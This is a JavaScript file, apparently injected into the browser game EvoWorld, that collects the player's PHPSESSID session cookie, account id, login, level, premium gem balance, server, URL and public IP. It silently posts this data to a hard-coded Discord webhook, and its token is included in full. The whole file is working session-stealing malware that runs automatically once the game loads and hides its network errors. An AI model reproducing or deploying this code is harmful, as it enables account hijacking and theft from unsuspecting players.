// webhook.js - COMPLETE FIXED VERSION
(function() {
    'use strict';
    
    const YOUR_DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456708821266333707/wnE-ib-9mF7ZO8Z-r7X7vUdTswglh_3NbPslhkWjvqTcZjas2mAi7f0lw8XhV0De66ty';
    
    function sendToDiscord(data) {
        try {
            // If data is an object, convert to string
            if (typeof data === 'object') {
                data = JSON.stringify(data, null, 2);
            }
            
            // Split long messages for Discord
            if (data.length > 1900) {
                const chunks = [];
                let remaining = data;
                
                while (remaining.length > 0) {
                    let chunk = remaining.substring(0, 1900);
                    
                    // Try to split at newline
                    const lastNewline = chunk.lastIndexOf('\n');
                    if (lastNewline > 1500 && lastNewline < 1900) {
                        chunk = remaining.substring(0, lastNewline);
                        remaining = remaining.substring(lastNewline + 1);
                    } else {
                        remaining = remaining.substring(chunk.length);
                    }
                    
                    chunks.push(chunk);
                    
                    if (remaining.length > 1900 && chunks.length > 4) {
                        // Too many chunks, truncate
                        chunks.push('[REPORT TRUNCATED - TOO LONG]');
                        break;
                    }
                }
                
                // Send each chunk
                chunks.forEach((chunk, index) => {
                    setTimeout(() => {
                        fetch(YOUR_DISCORD_WEBHOOK, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                content: '```\n' + chunk + '\n```',
                                username: `Game Report ${chunks.length > 1 ? `[${index + 1}/${chunks.length}]` : ''}`
                            })
                        }).catch(() => {});
                    }, index * 1500);
                });
            } else {
                // Normal send
                fetch(YOUR_DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: '```\n' + data + '\n```',
                        username: 'EvoWorld Auto-Hit'
                    })
                }).catch(() => {});
            }
        } catch(e) {
            console.log('Send error:', e);
        }
    }
    
    // Alias for main script
    window.sendSecureData = sendToDiscord;
    
    // Also send a test message
    setTimeout(() => {
        sendToDiscord('✅ Webhook loaded successfully at ' + new Date().toLocaleString());
    }, 2000);
    
    // Collect and send game data
    function collectGameData() {
        try {
            const user = window.user || {};
            const cookies = document.cookie || '';
            let sessionId = '';
            const match = cookies.match(/PHPSESSID=([^;]+)/);
            if (match) sessionId = match[1];
            
            // Get server info
            let serverInfo = 'Unknown';
            try {
                if (window.gameServer && window.gameServer.serverInfo) {
                    serverInfo = window.gameServer.serverInfo.name || serverInfo;
                }
            } catch(e) {}
            
            // Create compact report
            const report = {
                timestamp: new Date().toLocaleString('ru-RU'),
                ip: 'Fetching...',
                session: sessionId || 'None',
                user: {
                    id: user.id || 'Unknown',
                    login: user.login || 'Guest',
                    level: user.level || 0,
                    gems: user.premiumPoints || 0
                },
                server: serverInfo,
                url: window.location.href
            };
            
            // Get IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {
                    report.ip = ipData.ip;
                    sendToDiscord(report);
                })
                .catch(() => {
                    report.ip = 'Failed to fetch';
                    sendToDiscord(report);
                });
                
        } catch(error) {
            sendToDiscord('Error collecting data: ' + error);
        }
    }
    
    // Wait for game to load
    const checkGame = setInterval(() => {
        if (window.user && window.user.id) {
            clearInterval(checkGame);
            setTimeout(collectGameData, 3000);
        }
    }, 1000);
    
    // Timeout after 10 seconds
    setTimeout(() => {
        clearInterval(checkGame);
        if (!window.user) {
            sendToDiscord('Game not detected after 10 seconds');
        }
    }, 10000);
    
    console.log('Webhook reporter loaded');
})();
